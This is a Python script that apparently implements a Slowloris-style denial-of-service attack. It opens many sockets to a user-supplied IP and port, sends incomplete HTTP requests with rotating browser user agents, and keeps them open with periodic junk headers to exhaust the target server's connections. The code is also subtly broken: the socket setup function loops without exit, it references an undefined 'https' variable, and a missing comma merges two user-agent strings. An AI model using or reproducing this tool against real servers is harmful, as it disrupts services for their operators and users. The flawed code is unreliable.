import socket
import random
import time
import sys
import ssl
import traceback
import threading
import sqlite3

listOfSockets = list()
ip = None
port = None
user_agents = [
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393"
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
    "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0",
]


def socketInit(ip, port):

	global listOfSockets

	while True:
		if ip:

			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.settimeout(3)
			
			s.connect((ip, port))

		else:
			print('Please enter an IP address!')
			ip = input('IP: ')
			


	s.send('GET /?{} HTTP/1.1\r\n'.format(random.randint(0, 2000)).encode('utf-8'))
	header = 'User-Agent: {}\r\n'.format(random.choice(user_agents)).encode('utf-8')
	s.send(header)
	s.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
	print('{}. Socket port: {} IP: {}'.format(len(listOfSockets), 443 if https else 80, ip))
	return s



def main():

	if len(sys.argv) > 1:
		ip = sys.argv[1]
	else:
		ip = input('IP: ')

	if len(sys.argv) > 2:
		port = int(sys.argv[2])
	else:
		port = int(input('Port: '))

	if len(sys.argv) > 3:
		quantityOfSockets = int(sys.argv[3])
	else:
		quantityOfSockets = int(input('Quantity of sockets: '))

	
	for _ in range(quantityOfSockets):
		try:
			print('-----')
			s = socketInit(ip, port)
			listOfSockets.append(s)
		
		except ConnectionRefusedError:
			print('IP is not exists')
			break
		except OSError:
			print('Port is closed')
			break
		except socket.timeout:
			print('Maximum connections: {}'.format(len(listOfSockets)))
			break
		except:
			print(traceback.format_exc())
			continue

	

	print('Keeping active...')
	while True:

		if len(listOfSockets) == 0:
			break
		try:
			for s in listOfSockets:
				try:
					s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
				except socket.error:
					listOfSockets.remove(s)
			
			for _ in range(quantityOfSockets - len(listOfSockets)):
				try:
					s = socketInit(ip, port)
					if s:
						listOfSockets.append(s)
				except socket.timeout:
					print('Maximum connections: {}'.format(len(listOfSockets)))
					break
				except:
					break

			time.sleep(2)

		except:
			break


if __name__ == "__main__":
	main()


		



